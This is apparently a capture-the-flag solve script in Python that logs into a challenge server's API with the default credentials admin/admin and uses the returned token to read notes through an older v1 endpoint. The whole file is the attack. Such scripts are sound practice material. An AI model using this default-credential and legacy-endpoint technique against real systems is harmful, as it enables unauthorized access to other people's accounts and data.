import requests
import json

url = "http://exp.cybergame.sk:7021/api/v2/login"
r = requests.post(url, json={"username": "admin", "password": "admin"})
token = r.json().get("token")
r2 = requests.get("http://exp.cybergame.sk:7021/api/v1/notes", headers={"Authorization": f"Bearer {token}"})
print(r2.text)
